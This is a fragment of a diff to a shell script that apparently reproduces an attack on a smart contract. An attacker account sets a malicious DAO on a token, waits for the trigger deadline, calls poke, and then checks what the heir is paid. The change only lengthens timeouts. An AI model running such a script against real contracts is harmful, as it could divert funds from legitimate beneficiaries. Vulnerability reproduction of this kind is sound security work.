@@ -41,7 +41,7 @@ $TX call "$ATT" "$C" set_dao "{\"token_id\":\"$TOKEN\",\"dao_id\":\"$EVIL\"}" 30
 
 echo; echo "## wait for the deadline, then poke"
 while :; do now=$(date +%s%3N); trig=$(field "v['trigger_at_ms']"); [ "$now" -gt "$((trig + 2000))" ] && break; sleep 3; done
-$TX call "$ATT" "$C" poke "{\"token_id\":\"$TOKEN\"}" 30
+$TX call "$ATT" "$C" poke "{\"token_id\":\"$TOKEN\"}" 60
 
 declare -A B
 for i in 1 2 3 4 5; do
@@ -57,7 +57,7 @@ for e in json.load(sys.stdin)['log']:
     if 'dao' in e.get('kind','') or 'dao' in json.dumps(e): print(json.dumps(e))"
 
 echo; echo "## claim as the heir"
-CL=$($TX call "$HEIR" "$C" claim "{\"token_id\":\"$TOKEN\"}" 30); echo "$CL"
+CL=$($TX call "$HEIR" "$C" claim "{\"token_id\":\"$TOKEN\"}" 60); echo "$CL"
 PAID=$(echo "$CL" | sed -n 's/.*result: "\([0-9]*\)".*/\1/p')
 
 sleep 3
